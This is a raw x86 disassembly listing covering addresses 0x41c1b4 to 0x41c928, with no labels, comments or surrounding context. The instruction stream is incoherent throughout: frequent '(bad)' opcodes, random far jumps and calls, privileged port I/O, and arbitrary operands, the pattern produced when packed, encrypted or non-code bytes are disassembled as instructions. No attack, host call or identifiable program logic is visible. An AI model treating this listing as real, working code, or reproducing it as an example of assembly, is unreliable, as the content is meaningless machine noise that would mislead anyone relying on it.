  41c1b4:	in     eax,0x46
  41c1b6:	pop    edx
  41c1b7:	nop
  41c1b8:	dec    esi
  41c1b9:	push   edi
  41c1ba:	sbb    edx,DWORD PTR [ecx-0x5d]
  41c1bd:	pop    esp
  41c1be:	push   ds
  41c1bf:	mov    WORD PTR [eax+0x4d159a75],ds
  41c1c5:	jl     0x41c185
  41c1c7:	fs cmp al,0xd0
  41c1ca:	dec    esi
  41c1cb:	mov    al,0xbc
  41c1cd:	cmp    ecx,DWORD PTR [ebp+0x5a]
  41c1d0:	jge    0x41c1cb
  41c1d2:	sub    dl,ah
  41c1d4:	and    ah,dl
  41c1d6:	mov    ebx,0x1feaebd4
  41c1db:	jge    0x41c205
  41c1dd:	add    cl,bh
  41c1df:	xchg   edi,eax
  41c1e0:	out    dx,eax
  41c1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1e2:	add    DWORD PTR [esi-0x8],edx
  41c1e5:	cmp    al,0xbf
  41c1e7:	data16 (bad) 
  41c1e9:	rol    BYTE PTR [esp+ecx*4+0x6e4610e2],cl
  41c1f0:	dec    ebp
  41c1f1:	inc    esi
  41c1f2:	ins    BYTE PTR es:[edi],dx
  41c1f3:	fmul   DWORD PTR ds:0x9168b722
  41c1f9:	or     al,0xc0
  41c1fb:	cli    
  41c1fc:	inc    eax
  41c1fd:	mov    dh,BYTE PTR [ecx-0x68]
  41c200:	shl    BYTE PTR [ecx],1
  41c202:	sbb    bh,dh
  41c204:	retf   0x9907
  41c207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c208:	arpl   WORD PTR [edx+0x1f29e20b],bp
  41c20e:	imul   esi,DWORD PTR [edx],0xe83721d6
  41c214:	and    al,0x8d
  41c216:	sbb    ch,cl
  41c218:	aaa    
  41c219:	mov    ah,0xe4
  41c21b:	outs   dx,DWORD PTR ds:[esi]
  41c21c:	jns    0x41c224
  41c21e:	adc    DWORD PTR [ecx+0x41],esp
  41c221:	in     eax,0xcd
  41c223:	in     eax,0x69
  41c225:	push   ebp
  41c226:	mov    edi,0x9f34ede5
  41c22b:	dec    eax
  41c22c:	push   0x5c43a2d3
  41c231:	(bad)  
  41c232:	push   edx
  41c233:	push   0x5f
  41c235:	inc    si
  41c237:	push   0x7a1fe4ca
  41c23c:	cli    
  41c23d:	and    eax,0x47d4a1b0
  41c242:	arpl   WORD PTR [eax],bp
  41c244:	xor    al,0xea
  41c246:	mov    ecx,0x4bca36f8
  41c24b:	adc    al,0xea
  41c24d:	inc    ebx
  41c24e:	in     al,dx
  41c24f:	pop    edi
  41c250:	fs aad 0xf8
  41c253:	in     al,dx
  41c254:	repnz loop 0x41c2ae
  41c257:	xor    eax,0x9dc79abf
  41c25c:	mov    al,ds:0xf5e22e54
  41c261:	iret   
  41c262:	jo     0x41c259
  41c264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c265:	out    0x3d,al
  41c267:	mov    ebx,0x561504c4
  41c26c:	cmp    DWORD PTR ss:[edi-0x2b],esp
  41c270:	test   BYTE PTR [ecx-0x5097d88c],dh
  41c276:	rol    DWORD PTR [ebx],cl
  41c278:	stos   BYTE PTR es:[edi],al
  41c279:	cmc    
  41c27a:	inc    esi
  41c27b:	cmp    BYTE PTR [ebx-0x67228ae9],ah
  41c281:	add    eax,DWORD PTR [esi+0x9]
  41c284:	adc    BYTE PTR ds:0x61945348,0x4e
  41c28b:	das    
  41c28c:	mov    ch,0x22
  41c28e:	sbb    al,BYTE PTR ds:0x68cfa332
  41c294:	js     0x41c268
  41c296:	ss lahf 
  41c298:	(bad)  
  41c299:	and    eax,0xbd723e06
  41c29e:	mov    edi,0xf8a71711
  41c2a3:	lahf   
  41c2a4:	mov    al,ch
  41c2a6:	xchg   ecx,eax
  41c2a7:	cmp    edx,0x2ae0f9b4
  41c2ad:	ret    
  41c2ae:	push   ecx
  41c2af:	add    bl,ah
  41c2b1:	adc    DWORD PTR [edx+0x7b24ca68],ebp
  41c2b7:	mov    BYTE PTR [edi],cl
  41c2b9:	and    al,0xa3
  41c2bb:	sub    al,cl
  41c2bd:	push   eax
  41c2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2bf:	sub    BYTE PTR [ebp-0x1f2004e6],dl
  41c2c5:	arpl   WORD PTR [esi],bp
  41c2c7:	out    0x7e,eax
  41c2c9:	sbb    eax,0xf01fd7f3
  41c2ce:	mov    ds:0xf2c50529,al
  41c2d3:	dec    ecx
  41c2d4:	xchg   ebp,eax
  41c2d5:	add    al,0x57
  41c2d7:	mov    ecx,fs
  41c2d9:	inc    eax
  41c2da:	popw   es
  41c2dc:	push   ds
  41c2dd:	sti    
  41c2de:	ds cmp ah,cl
  41c2e1:	dec    esp
  41c2e3:	lea    ebp,[esi-0x2370d50d]
  41c2e9:	xor    eax,DWORD PTR [edi+0x43690849]
  41c2ef:	loope  0x41c2d3
  41c2f1:	mov    ebp,0x5298d37b
  41c2f6:	nop
  41c2f7:	enter  0x40fb,0x38
  41c2fb:	rcr    DWORD PTR [ebx+0x36],cl
  41c2fe:	rol    DWORD PTR [esi+ebx*2-0x24c5c271],0xa2
  41c306:	or     ebp,DWORD PTR [edx+edi*2-0x2a]
  41c30a:	(bad)  
  41c30b:	jecxz  0x41c345
  41c30d:	std    
  41c30e:	and    dl,cl
  41c310:	mov    bh,bl
  41c312:	jne    0x41c303
  41c314:	pop    ebp
  41c315:	xor    BYTE PTR [esp+edi*4+0x43],ah
  41c319:	data16 fwait
  41c31b:	test   BYTE PTR [ecx-0x76],al
  41c31e:	pop    ss
  41c31f:	test   DWORD PTR [ebx+0x44],eax
  41c322:	icebp  
  41c323:	sahf   
  41c324:	add    dh,BYTE PTR [edi]
  41c326:	dec    esp
  41c327:	cld    
  41c328:	sub    DWORD PTR [ebx-0x403cf93b],esi
  41c32e:	cmp    bl,BYTE PTR [ebx-0x17]
  41c331:	loope  0x41c365
  41c333:	xchg   DWORD PTR [eax],edi
  41c335:	xor    al,0xb3
  41c337:	outs   dx,BYTE PTR ds:[esi]
  41c338:	test   al,0xa9
  41c33a:	pop    edi
  41c33b:	je     0x41c333
  41c33d:	aam    0xce
  41c33f:	mov    esi,0xe77e6ef5
  41c344:	cmp    DWORD PTR [ebp+0x7a7d6e67],esp
  41c34a:	jmp    0x41c381
  41c34c:	fbstp  TBYTE PTR [ebx+edx*1]
  41c34f:	jno    0x41c388
  41c351:	(bad)  
  41c353:	mov    esi,DWORD PTR [ecx]
  41c355:	repz hlt 
  41c357:	add    al,0x42
  41c359:	sahf   
  41c35a:	data16 jae 0x41c392
  41c35d:	sub    DWORD PTR [edi+0x45],esp
  41c360:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41c362:	loopne 0x41c33d
  41c364:	or     eax,0x680dd21
  41c369:	retf   
  41c36a:	stos   BYTE PTR es:[edi],al
  41c36b:	lods   al,BYTE PTR ds:[esi]
  41c36c:	fiadd  DWORD PTR fs:[eax-0x6e6343be]
  41c373:	push   cs
  41c374:	jno    0x41c30f
  41c376:	jg     0x41c3d6
  41c378:	and    eax,0x793c1662
  41c37d:	mov    DWORD PTR [eax-0x21a552a3],ebx
  41c383:	popa   
  41c384:	and    ebp,ebp
  41c386:	lock cmp ah,al
  41c389:	mov    edi,DWORD PTR [ecx+0x3d]
  41c38c:	mov    esp,0xaf739787
  41c391:	cmp    ah,BYTE PTR [edi+0x69]
  41c394:	sub    DWORD PTR ds:[esi],ebp
  41c397:	jmp    0x306e45f
  41c39c:	outs   dx,DWORD PTR cs:[esi]
  41c39e:	sub    eax,0x6f3cbe42
  41c3a3:	call   0x99fc:0x7cbd876a
  41c3aa:	pop    edi
  41c3ab:	or     DWORD PTR [esi-0x15a8cd5a],0x3307869c
  41c3b5:	adc    eax,0xb9ea6ef
  41c3ba:	in     eax,0x18
  41c3bc:	sbb    ecx,esp
  41c3be:	sti    
  41c3bf:	sbb    bh,BYTE PTR [esi+esi*8-0x59]
  41c3c3:	ss jmp 0x41c40a
  41c3c6:	popa   
  41c3c7:	mov    eax,0xfa89b2a2
  41c3cc:	pop    eax
  41c3cd:	ss shl bl,0x93
  41c3d1:	ja     0x41c405
  41c3d3:	dec    esp
  41c3d4:	cld    
  41c3d5:	enter  0x6a0d,0xeb
  41c3d9:	pop    eax
  41c3da:	nop
  41c3db:	dec    eax
  41c3dc:	adc    dh,BYTE PTR [ecx]
  41c3de:	pop    ss
  41c3df:	xchg   esp,eax
  41c3e0:	add    ecx,ebx
  41c3e2:	idiv   BYTE PTR [ebx]
  41c3e4:	paddusw mm3,QWORD PTR [edx-0x7]
  41c3e8:	bound  ecx,QWORD PTR [ebx-0x199e6f37]
  41c3ee:	out    0x3e,al
  41c3f0:	ror    BYTE PTR [edx+0x496e6d8f],0x2
  41c3f7:	or     al,dh
  41c3f9:	inc    ecx
  41c3fa:	popa   
  41c3fb:	bound  eax,QWORD PTR [edx-0x7717bc79]
  41c401:	ins    DWORD PTR es:[edi],dx
  41c402:	push   ecx
  41c403:	pop    edi
  41c404:	mov    al,0x7d
  41c406:	in     eax,dx
  41c407:	jnp    0x41c3b4
  41c409:	mov    ecx,0x23c61d65
  41c40f:	cdq    
  41c410:	aad    0x60
  41c412:	lea    esi,[esi]
  41c414:	out    0xb8,al
  41c416:	div    DWORD PTR [edi+0x21]
  41c419:	dec    eax
  41c41a:	scas   al,BYTE PTR es:[edi]
  41c41b:	jp     0x41c46e
  41c41d:	neg    DWORD PTR [edx-0x21a9ba01]
  41c423:	pop    esi
  41c424:	fwait
  41c425:	jmp    0x77be2d09
  41c42a:	cs jmp 0xa53c:0x34761714
  41c432:	xchg   BYTE PTR [eax],bl
  41c434:	add    eax,0x13283de4
  41c439:	fisub  WORD PTR [edx-0x60]
  41c43c:	out    0x1,eax
  41c43e:	mov    BYTE PTR [eax],ah
  41c440:	add    eax,0x13aabda6
  41c445:	stos   DWORD PTR es:[edi],eax
  41c446:	jmp    0x35405d82
  41c44b:	sub    al,0x46
  41c44e:	mov    bh,0x8b
  41c450:	loop   0x41c3f5
  41c452:	fadd   QWORD PTR [ebp-0x4c8875c3]
  41c458:	cld    
  41c459:	push   ss
  41c45a:	push   ds
  41c45b:	pushf  
  41c45c:	shl    BYTE PTR [edx],0xca
  41c45f:	mov    cl,0x35
  41c461:	out    0x29,eax
  41c463:	inc    edi
  41c464:	ret    0x5f0e
  41c467:	sar    BYTE PTR [esi-0x6],0xaa
  41c46b:	shl    BYTE PTR [esi+ebp*8+0xd92d8a5],cl
  41c472:	(bad)  
  41c473:	std    
  41c474:	les    ebp,FWORD PTR [edx-0x2c55df1d]
  41c47a:	adc    BYTE PTR [ecx-0x45d25eae],bl
  41c480:	pop    ebp
  41c481:	fadd   st,st(3)
  41c483:	push   edi
  41c484:	(bad)  
  41c485:	xchg   edx,eax
  41c486:	push   edi
  41c487:	mov    esp,0x68299588
  41c48c:	jecxz  0x41c462
  41c48e:	push   0x3b
  41c490:	jmp    FWORD PTR [ebp+0x39c1fe00]
  41c496:	xchg   esi,edx
  41c498:	mov    dh,0x7a
  41c49a:	mov    edi,0x72cb9548
  41c49f:	jge    0x41c440
  41c4a1:	push   edx
  41c4a2:	test   BYTE PTR [ecx],ah
  41c4a4:	in     eax,dx
  41c4a5:	xchg   edi,eax
  41c4a6:	cmp    cl,ch
  41c4a8:	or     eax,0x34c74033
  41c4ad:	sbb    DWORD PTR [edx+0x4c82791d],0xffffffdc
  41c4b4:	(bad)  
  41c4b6:	and    ebp,edi
  41c4b8:	neg    BYTE PTR [ebp-0x1]
  41c4bb:	push   ebp
  41c4bc:	imul   BYTE PTR [esi]
  41c4be:	dec    ecx
  41c4bf:	jae    0x41c469
  41c4c1:	dec    ebx
  41c4c2:	cdq    
  41c4c3:	mov    edx,0xc30f785
  41c4c8:	rol    BYTE PTR [ebp+0xdcf0d7a],1
  41c4ce:	mov    edi,0x537a98ee
  41c4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d4:	push   ss
  41c4d5:	xchg   ecx,eax
  41c4d6:	mov    dl,0xa8
  41c4d8:	sbb    dl,dh
  41c4da:	mov    ds:0x3c2b1353,eax
  41c4df:	cmp    bl,BYTE PTR cs:[ebp-0x41]
  41c4e3:	pop    ecx
  41c4e4:	inc    edi
  41c4e5:	test   cl,cl
  41c4e7:	shl    BYTE PTR [edx+ecx*4-0x386f40ab],1
  41c4ee:	out    dx,al
  41c4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4f0:	mov    bl,0x90
  41c4f2:	fsubr  QWORD PTR [edi]
  41c4f4:	push   edi
  41c4f5:	fild   WORD PTR [esi]
  41c4f7:	add    edx,DWORD PTR ds:0xb10fc658
  41c4fd:	mov    al,0x5d
  41c4ff:	jle    0x41c4aa
  41c501:	fisttp QWORD PTR [ebx]
  41c503:	mul    ah
  41c505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c506:	mov    ah,0x35
  41c508:	inc    edx
  41c509:	or     eax,0x682d9ead
  41c50e:	nop    DWORD PTR [edi+0x2a]
  41c512:	push   ecx
  41c513:	ins    DWORD PTR es:[edi],dx
  41c514:	dec    ebp
  41c515:	imul   dh
  41c517:	rol    BYTE PTR [edx],1
  41c519:	mov    ds:0xc0defbb3,eax
  41c51e:	jg     0x41c56e
  41c520:	in     eax,dx
  41c521:	cmc    
  41c522:	xchg   BYTE PTR [ebp-0x31],dh
  41c525:	stos   DWORD PTR es:[edi],eax
  41c526:	popa   
  41c527:	push   ds
  41c528:	je     0x41c513
  41c52a:	mov    WORD PTR [esi-0x31b4000c],?
  41c530:	data16 sbb dl,ch
  41c533:	or     al,0xf1
  41c535:	mov    esi,0x12b02029
  41c53a:	in     eax,0x6b
  41c53c:	dec    edi
  41c53d:	push   esp
  41c53e:	mov    ebx,0x6b949886
  41c543:	push   esp
  41c544:	xor    BYTE PTR [esi],0xbf
  41c547:	add    DWORD PTR ds:0x45694cb9,0x34da5186
  41c551:	mov    al,0x64
  41c553:	cmp    BYTE PTR [edi+0x5ece8b67],0x12
  41c55a:	mov    ebp,0x83baf0c
  41c55f:	lods   eax,DWORD PTR ds:[esi]
  41c560:	hlt    
  41c561:	lahf   
  41c562:	repnz xor dl,BYTE PTR [edi]
  41c565:	xor    BYTE PTR [edx*1-0x1ea97081],0x54
  41c56d:	sar    BYTE PTR [edi],1
  41c56f:	push   ebx
  41c570:	retf   0x2fb3
  41c573:	push   esi
  41c574:	sar    DWORD PTR [ecx],1
  41c576:	or     eax,0x815f413a
  41c57b:	and    BYTE PTR [esi+esi*1],cl
  41c57e:	(bad)  
  41c57f:	pop    ds
  41c580:	pop    ds
  41c581:	jbe    0x41c535
  41c583:	ja     0x41c580
  41c585:	push   ds
  41c586:	dec    ecx
  41c587:	inc    edi
  41c588:	test   DWORD PTR [ebx+0x14],esi
  41c58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c58c:	sti    
  41c58d:	loopne 0x41c609
  41c58f:	inc    eax
  41c590:	stc    
  41c591:	push   edi
  41c592:	and    edx,DWORD PTR [edx]
  41c594:	cwde   
  41c595:	outs   dx,BYTE PTR ds:[esi]
  41c596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c597:	loope  0x41c5f6
  41c599:	pusha  
  41c59a:	cmp    BYTE PTR [ecx-0x6b2ce2b0],0x6c
  41c5a1:	xor    al,0xf3
  41c5a3:	inc    ebp
  41c5a4:	jns    0x41c5fd
  41c5a6:	retf   0x18cc
  41c5a9:	or     edi,DWORD PTR es:[edx]
  41c5ac:	or     edx,DWORD PTR [ecx]
  41c5ae:	pop    ds
  41c5af:	jae    0x41c5de
  41c5b1:	jmp    0xb3b76754
  41c5b6:	fisttp DWORD PTR [edi+0x7f]
  41c5b9:	nop
  41c5ba:	push   ss
  41c5bb:	bound  edx,QWORD PTR [ebx+0x7e9cf510]
  41c5c1:	jbe    0x41c5ab
  41c5c3:	out    dx,eax
  41c5c4:	xchg   ebp,eax
  41c5c5:	(bad)  
  41c5c6:	cmp    eax,0x4b956c8a
  41c5cb:	ret    
  41c5cc:	pop    esi
  41c5cd:	push   esi
  41c5ce:	or     eax,0xf32f53d6
  41c5d3:	pop    eax
  41c5d4:	mov    BYTE PTR [ebx],al
  41c5d6:	aas    
  41c5d7:	push   esi
  41c5d8:	lock lahf 
  41c5da:	jno    0x41c5a2
  41c5dc:	repz jne 0x41c5de
  41c5df:	add    al,0x1
  41c5e1:	xor    ch,dh
  41c5e3:	lods   al,BYTE PTR ds:[esi]
  41c5e4:	mov    ah,0x20
  41c5e6:	ret    
  41c5e7:	xchg   ah,cl
  41c5e9:	sar    DWORD PTR [ebp+0x6fb45e38],0xb4
  41c5f0:	enter  0x8caf,0xe6
  41c5f4:	mov    esi,DWORD PTR [ebx+edx*1]
  41c5f7:	test   ebp,esp
  41c5f9:	popf   
  41c5fa:	popa   
  41c5fb:	jnp    0x41c5b7
  41c5fd:	nop
  41c5fe:	sbb    BYTE PTR [edx-0x7a818e41],ch
  41c604:	pop    ebx
  41c605:	out    0xb1,al
  41c607:	or     al,dh
  41c609:	mov    esi,gs
  41c60b:	nop
  41c60c:	sub    eax,0xd95f35ff
  41c611:	inc    ebp
  41c612:	pushf  
  41c613:	sub    DWORD PTR [edi+0x44],ebx
  41c616:	mov    dl,0xe6
  41c618:	jmp    0x41c5cd
  41c61a:	(bad)  
  41c61b:	adc    al,0x3b
  41c61d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c61e:	jnp    0x41c65a
  41c620:	mov    ?,WORD PTR [ecx+0x6]
  41c623:	les    ecx,FWORD PTR [eax+0x69d24c74]
  41c629:	mov    eax,0xd5a9fadf
  41c62e:	xor    eax,0x887f534c
  41c633:	sbb    eax,0x1fc85942
  41c638:	test   eax,0x15b459da
  41c63d:	jmp    0x41c6ad
  41c63f:	neg    BYTE PTR [esi+ebp*8+0x51]
  41c643:	in     eax,0xf
  41c645:	fmul   DWORD PTR [edi+ecx*1]
  41c648:	jp     0x41c669
  41c64a:	lods   al,BYTE PTR ds:[esi]
  41c64c:	mov    cl,0x15
  41c64e:	and    DWORD PTR [ecx],0x21
  41c651:	adc    ecx,0xffffffa4
  41c654:	jno    0x41c654
  41c656:	fs enter 0x1ced,0x1d
  41c65b:	es mov al,0xf0
  41c65e:	adc    BYTE PTR [ebx+0x2],dl
  41c661:	dec    eax
  41c662:	jae    0x41c61a
  41c664:	mov    dh,BYTE PTR [edx+0x6]
  41c667:	jg     0x41c5ea
  41c669:	popf   
  41c66a:	into   
  41c66b:	add    ah,BYTE PTR [ebp-0x3b4c7b3a]
  41c671:	in     al,0x4b
  41c673:	clc    
  41c674:	push   ds
  41c675:	adc    DWORD PTR [edi],esp
  41c677:	test   DWORD PTR [ebx-0x5],ebx
  41c67a:	jno    0x41c62b
  41c67c:	mov    WORD PTR [ebx],es
  41c67e:	xor    ch,BYTE PTR [edi+0x5b]
  41c681:	cs out dx,al
  41c683:	mov    ds:0xb8a81d9d,al
  41c688:	jecxz  0x41c6d7
  41c68a:	(bad)  
  41c68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c68c:	stc    
  41c68d:	xor    BYTE PTR [eax+edi*4+0x49a60147],0xf5
  41c695:	bnd je 0x41c6d2
  41c698:	sbb    bl,BYTE PTR [ecx]
  41c69a:	test   eax,0x53614dfb
  41c69f:	inc    esi
  41c6a0:	repz push es
  41c6a2:	cli    
  41c6a3:	pop    ecx
  41c6a4:	sbb    eax,0xa90c0065
  41c6a9:	cmc    
  41c6aa:	xor    BYTE PTR [ebp+0x17ea53c4],ch
  41c6b0:	mov    ah,0x93
  41c6b2:	(bad)  
  41c6b3:	je     0x41c706
  41c6b5:	xor    DWORD PTR [ebx+edx*4-0x3f6bf6a3],edx
  41c6bc:	pop    ss
  41c6bd:	sub    BYTE PTR [esi],0x14
  41c6c0:	(bad)  
  41c6c1:	loope  0x41c6b6
  41c6c3:	xchg   edi,eax
  41c6c4:	push   edi
  41c6c5:	(bad)  
  41c6c6:	jne    0x41c702
  41c6c8:	paddusw mm7,mm7
  41c6cb:	nop
  41c6cc:	add    bh,bl
  41c6ce:	scas   al,BYTE PTR es:[edi]
  41c6cf:	push   edi
  41c6d0:	sbb    eax,0xfb30c523
  41c6d5:	cld    
  41c6d6:	jb     0x41c6e6
  41c6d8:	cdq    
  41c6d9:	jns    0x41c6ce
  41c6db:	std    
  41c6dc:	pop    ss
  41c6dd:	sub    al,0xc
  41c6df:	push   ecx
  41c6e0:	push   cs
  41c6e1:	inc    ebp
  41c6e2:	jb     0x41c748
  41c6e4:	cmp    DWORD PTR [ecx],esi
  41c6e6:	aas    
  41c6e7:	mov    dl,0xe7
  41c6e9:	cmp    DWORD PTR [ebx],ecx
  41c6eb:	jge    0x41c6e8
  41c6ed:	bnd jno 0x41c753
  41c6f0:	sbb    eax,0xca7e589c
  41c6f5:	stc    
  41c6f6:	push   ds
  41c6f7:	sahf   
  41c6f8:	cmc    
  41c6f9:	jmp    0xc75f:0x290674d
  41c700:	adc    ah,al
  41c702:	in     al,0x60
  41c704:	ins    DWORD PTR es:[edi],dx
  41c705:	cs jmp 0xb048:0x113b3d89
  41c70d:	ficom  WORD PTR [ecx-0x42605f7d]
  41c713:	shl    DWORD PTR [ecx],1
  41c715:	fsubr  st,st(2)
  41c717:	cld    
  41c718:	in     eax,0x61
  41c71a:	push   ebx
  41c71b:	or     ch,bl
  41c71d:	jle    0x41c78f
  41c71f:	fcomp  QWORD PTR [esi+0x4df67712]
  41c725:	add    esi,DWORD PTR [esi+0x70]
  41c728:	adc    DWORD PTR [edx],edx
  41c72a:	out    0x4c,al
  41c72c:	daa    
  41c72d:	jne    0x41c72a
  41c72f:	mov    ss,WORD PTR [edi-0x54526ae9]
  41c735:	push   ebx
  41c736:	mov    eax,0xa34fb8da
  41c73b:	ss cmc 
  41c73d:	(bad)  
  41c73e:	daa    
  41c73f:	and    edx,DWORD PTR [ebx-0x14]
  41c742:	fwait
  41c743:	push   es
  41c744:	loopne 0x41c735
  41c746:	les    esp,FWORD PTR [edi+0x2e93a822]
  41c74c:	ss fs scas al,BYTE PTR es:[edi]
  41c74f:	popf   
  41c750:	jb     0x41c741
  41c752:	stos   DWORD PTR es:[edi],eax
  41c753:	icebp  
  41c754:	arpl   WORD PTR [ebp-0x773f2328],bx
  41c75a:	data16 sub BYTE PTR [ebx-0x50aef876],dh
  41c761:	mov    cs,esi
  41c763:	lods   eax,DWORD PTR ds:[esi]
  41c764:	sub    edx,esp
  41c766:	or     eax,0x649710c
  41c76b:	das    
  41c76c:	add    eax,0x632b0fd2
  41c771:	loop   0x41c7c5
  41c773:	mov    BYTE PTR [edx],0xd9
  41c776:	xchg   esp,eax
  41c777:	aaa    
  41c778:	sar    BYTE PTR [ebx-0x53],1
  41c77b:	mov    al,0xd2
  41c77d:	outs   dx,BYTE PTR ds:[esi]
  41c77e:	test   eax,0xb29689ac
  41c783:	adc    al,0xc3
  41c785:	out    dx,al
  41c786:	fwait
  41c787:	pop    esp
  41c788:	dec    eax
  41c789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c78a:	fst    DWORD PTR [eax]
  41c78c:	cwde   
  41c78d:	lea    ebx,[ebp-0x57]
  41c790:	push   ds
  41c791:	or     bh,BYTE PTR [ebp+0x64]
  41c794:	xor    BYTE PTR [edx],0xaf
  41c797:	push   ds
  41c798:	test   eax,0x267bf7c4
  41c79d:	and    DWORD PTR [ecx],eax
  41c79f:	fsubr  DWORD PTR [edx+ebp*4]
  41c7a2:	xchg   esp,eax
  41c7a3:	push   esp
  41c7a4:	les    eax,FWORD PTR [ebx-0x7a]
  41c7a7:	loop   0x41c7b1
  41c7a9:	in     al,0x31
  41c7ab:	mov    bh,0x6b
  41c7ad:	js     0x41c810
  41c7af:	mov    dl,0xb
  41c7b1:	popf   
  41c7b2:	xor    al,0x7a
  41c7b4:	iret   
  41c7b5:	push   ecx
  41c7b6:	pop    eax
  41c7b7:	xor    dl,0x76
  41c7ba:	push   ecx
  41c7bb:	jns    0x41c750
  41c7bd:	out    0xec,eax
  41c7bf:	adc    BYTE PTR [ebx-0x63],al
  41c7c2:	(bad)  
  41c7c3:	mov    edx,0x948eb95c
  41c7c8:	xor    ah,BYTE PTR [eax]
  41c7ca:	and    cl,BYTE PTR [esi]
  41c7cc:	cmp    eax,DWORD PTR [esi-0x25]
  41c7cf:	imul   ebx,DWORD PTR [edi-0x6fad339f],0xd2a39644
  41c7d9:	sbb    eax,0xbfe41cb0
  41c7de:	cmp    esp,DWORD PTR [esi+edx*1]
  41c7e1:	pop    edi
  41c7e2:	cmp    BYTE PTR [ebx],dl
  41c7e4:	mov    al,0xc5
  41c7e6:	rcl    BYTE PTR [edi-0x25],0x10
  41c7ea:	mov    edi,0xaf116566
  41c7ef:	int3   
  41c7f0:	repz das 
  41c7f2:	sbb    ah,cl
  41c7f4:	stos   BYTE PTR es:[edi],al
  41c7f5:	dec    esi
  41c7f6:	push   ebp
  41c7f7:	push   ebp
  41c7f8:	cmp    al,0x6
  41c7fa:	aaa    
  41c7fb:	pop    ebx
  41c7fc:	mul    DWORD PTR [esi-0x7cc1a1c9]
  41c802:	into   
  41c803:	aam    0xda
  41c805:	adc    al,0xec
  41c807:	or     al,BYTE PTR [edx+0x4e]
  41c80a:	pop    es
  41c80b:	fcomp  DWORD PTR ds:0x5b23cff8
  41c811:	dec    esi
  41c812:	xchg   ebx,eax
  41c813:	repz cmp al,ah
  41c816:	outs   dx,BYTE PTR ds:[esi]
  41c817:	or     DWORD PTR [edi-0x1c74be8a],ebx
  41c81d:	and    DWORD PTR [edx],ebx
  41c81f:	(bad)  
  41c820:	mov    ebp,0xdd204a6d
  41c825:	int3   
  41c826:	jmp    0xeda7:0x67aefe18
  41c82d:	or     esi,ebx
  41c82f:	xor    al,0x32
  41c831:	xor    ah,dh
  41c833:	mov    ebx,0xcbd70c1
  41c838:	jl     0x41c8b5
  41c83a:	xchg   esp,eax
  41c83b:	mov    bh,0x2e
  41c83d:	jmp    0xf5e1:0x954ab3e4
  41c844:	xor    ebp,DWORD PTR ds:0x943cb229
  41c84a:	inc    eax
  41c84b:	(bad)  
  41c84c:	pop    eax
  41c84d:	add    DWORD PTR [ebx+0x620c8773],0x70a39134
  41c857:	mov    BYTE PTR [ebx+ebx*8],cl
  41c85a:	push   edi
  41c85b:	cs jmp 0x3cb958e2
  41c861:	mov    WORD PTR [edi+0x29],fs
  41c864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c865:	xchg   ebx,eax
  41c866:	inc    BYTE PTR [ecx+0x79]
  41c869:	lahf   
  41c86a:	ret    0x5222
  41c86d:	shl    BYTE PTR [edx+0x7ef6f9a4],0xe2
  41c874:	fist   DWORD PTR [esi+0x299df086]
  41c87a:	mov    eax,ds:0xc6dda3f0
  41c87f:	out    0xa4,eax
  41c881:	pop    eax
  41c882:	or     eax,0x5e17e985
  41c887:	sbb    dh,bl
  41c889:	ja     0x41c846
  41c88b:	cwde   
  41c88c:	cmc    
  41c88d:	stc    
  41c88e:	aaa    
  41c88f:	push   ecx
  41c890:	loopne 0x41c829
  41c892:	ret    0x2f2e
  41c895:	mov    DWORD PTR [ecx+0x27],edi
  41c898:	jns    0x41c8a9
  41c89a:	xchg   ebx,eax
  41c89b:	cmp    eax,0xec7e0c11
  41c8a0:	pushf  
  41c8a1:	enter  0x572b,0x31
  41c8a5:	mov    dl,0xb2
  41c8a7:	fs call ecx
  41c8aa:	dec    ecx
  41c8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ac:	scas   eax,DWORD PTR es:[edi]
  41c8ad:	fmul   QWORD PTR [ecx+0x1d64955c]
  41c8b3:	mov    bh,0x56
  41c8b5:	adc    eax,0x83a40c23
  41c8ba:	ret    
  41c8bb:	inc    eax
  41c8bc:	ror    BYTE PTR [eax],1
  41c8be:	xchg   ebp,eax
  41c8bf:	push   edi
  41c8c0:	repz dec edi
  41c8c2:	mov    ds:0xe5948f07,eax
  41c8c7:	pop    ebx
  41c8c8:	mov    dl,0xd0
  41c8ca:	repnz lock mov bh,0xc2
  41c8ce:	out    0xae,eax
  41c8d0:	mov    ds,WORD PTR [edx-0x45]
  41c8d3:	call   0xb3b3dac0
  41c8d8:	and    dh,BYTE PTR [eax-0x9]
  41c8db:	adc    ecx,0xfffffff5
  41c8de:	shr    ecx,0x26
  41c8e1:	int    0xfe
  41c8e3:	shl    BYTE PTR [edx],cl
  41c8e5:	inc    ebp
  41c8e6:	xor    al,0x1c
  41c8e8:	mov    ch,ch
  41c8ea:	adc    al,0xc6
  41c8ec:	push   ebp
  41c8ed:	push   esp
  41c8ee:	popa   
  41c8ef:	xchg   ecx,eax
  41c8f0:	cs jmp 0x5145:0xbe06b6e
  41c8f8:	jb     0x41c8e8
  41c8fa:	xor    DWORD PTR [esi+0x26],esp
  41c8fd:	ret    
  41c8fe:	pop    ecx
  41c8ff:	dec    ebp
  41c900:	mov    edi,0x44ab93e7
  41c905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c906:	les    ecx,FWORD PTR [ebx]
  41c908:	sub    eax,0x8c4e817c
  41c90d:	cs stc 
  41c90f:	sub    ch,BYTE PTR [ecx]
  41c911:	stos   DWORD PTR es:[edi],eax
  41c912:	sbb    eax,0x32141a47
  41c917:	retf   0x9df
  41c91a:	adc    al,0x34
  41c91c:	neg    DWORD PTR [esi+edx*1-0x5]
  41c920:	(bad)  
  41c922:	test   eax,0xfb5fca
  41c927:	xchg   ebx,eax
  41c928:	pop    esp
